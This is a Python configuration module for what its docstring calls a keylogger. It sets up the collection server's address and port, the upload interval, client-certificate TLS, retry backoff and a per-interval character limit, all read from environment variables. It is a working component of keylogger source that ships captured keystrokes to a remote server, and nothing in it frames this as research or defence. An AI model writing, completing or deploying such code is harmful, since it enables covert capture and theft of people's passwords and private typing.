"""
Configuration module for the keylogger.
Handles validation, environment variable loading, and SSL context creation.
"""

import os
import re
import ssl
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional


@dataclass
class KeyloggerConfig:
    """Configuration class with validation."""

    ip_address: str = "127.0.0.1"
    port: int = 8080
    interval: int = 10
    use_tls: bool = False
    ca_cert_path: Optional[str] = None
    client_cert_path: Optional[str] = None
    client_key_path: Optional[str] = None
    verify_ssl: bool = True
    max_retries: int = 3
    base_backoff: float = 1.0
    max_backoff: float = 60.0
    log_level: str = "INFO"
    log_file: Optional[str] = None
    log_max_bytes: int = 10 * 1024 * 1024  # 10MB
    log_backup_count: int = 5
    rate_limit_per_interval: int = 10000  # max chars per interval

    def __post_init__(self) -> None:
        self._validate()

    def _validate(self) -> None:
        """Validate configuration values."""
        # Validate IP address
        if not self._is_valid_ip(self.ip_address):
            raise ValueError(f"Invalid IP address: {self.ip_address}")

        # Validate port
        if not 1 <= self.port <= 65535:
            raise ValueError(f"Invalid port: {self.port}")

        # Validate interval
        if not 1 <= self.interval <= 3600:
            raise ValueError(f"Interval must be between 1 and 3600 seconds: {self.interval}")

        # Validate TLS settings
        if self.use_tls:
            if self.ca_cert_path and not Path(self.ca_cert_path).exists():
                raise ValueError(f"CA certificate not found: {self.ca_cert_path}")
            if self.client_cert_path and not Path(self.client_cert_path).exists():
                raise ValueError(f"Client certificate not found: {self.client_cert_path}")
            if self.client_key_path and not Path(self.client_key_path).exists():
                raise ValueError(f"Client key not found: {self.client_key_path}")

        # Validate log level
        valid_levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]
        if self.log_level.upper() not in valid_levels:
            raise ValueError(f"Invalid log level: {self.log_level}. Must be one of {valid_levels}")

        # Validate retry settings
        if self.max_retries < 0:
            raise ValueError("max_retries must be non-negative")
        if self.base_backoff <= 0:
            raise ValueError("base_backoff must be positive")
        if self.max_backoff < self.base_backoff:
            raise ValueError("max_backoff must be >= base_backoff")

    @staticmethod
    def _is_valid_ip(ip: str) -> bool:
        """Validate IP address (IPv4)."""
        pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
        if not re.match(pattern, ip):
            return False
        parts = ip.split(".")
        return all(0 <= int(part) <= 255 for part in parts)

    @property
    def base_url(self) -> str:
        """Get base URL for requests."""
        scheme = "https" if self.use_tls else "http"
        return f"{scheme}://{self.ip_address}:{self.port}"

    def get_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Create SSL context for secure connections."""
        if not self.use_tls:
            return None

        context = ssl.create_default_context(cafile=self.ca_cert_path)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_REQUIRED if self.verify_ssl else ssl.CERT_NONE

        if self.client_cert_path and self.client_key_path:
            context.load_cert_chain(self.client_cert_path, self.client_key_path)

        return context


def load_config_from_env() -> KeyloggerConfig:
    """Load and validate configuration from environment variables."""

    def get_env(key: str, default: Any, type_func: type = str) -> Any:
        value = os.getenv(key, default)
        try:
            return type_func(value)
        except (ValueError, TypeError) as e:
            raise ValueError(f"Invalid value for {key}: {value}") from e

    config = KeyloggerConfig(
        ip_address=get_env("KEYLOGGER_IP", "127.0.0.1"),
        port=get_env("KEYLOGGER_PORT", 8080, int),
        interval=get_env("KEYLOGGER_INTERVAL", 10, int),
        use_tls=get_env("KEYLOGGER_USE_TLS", "false").lower() in ("true", "1", "yes"),
        ca_cert_path=get_env("KEYLOGGER_CA_CERT", None) or None,
        client_cert_path=get_env("KEYLOGGER_CLIENT_CERT", None) or None,
        client_key_path=get_env("KEYLOGGER_CLIENT_KEY", None) or None,
        verify_ssl=get_env("KEYLOGGER_VERIFY_SSL", "true").lower() in ("true", "1", "yes"),
        max_retries=get_env("KEYLOGGER_MAX_RETRIES", 3, int),
        base_backoff=get_env("KEYLOGGER_BASE_BACKOFF", 1.0, float),
        max_backoff=get_env("KEYLOGGER_MAX_BACKOFF", 60.0, float),
        log_level=get_env("KEYLOGGER_LOG_LEVEL", "INFO"),
        log_file=get_env("KEYLOGGER_LOG_FILE", None) or None,
        log_max_bytes=get_env("KEYLOGGER_LOG_MAX_BYTES", 10 * 1024 * 1024, int),
        log_backup_count=get_env("KEYLOGGER_LOG_BACKUP_COUNT", 5, int),
        rate_limit_per_interval=get_env("KEYLOGGER_RATE_LIMIT", 10000, int),
    )
    return config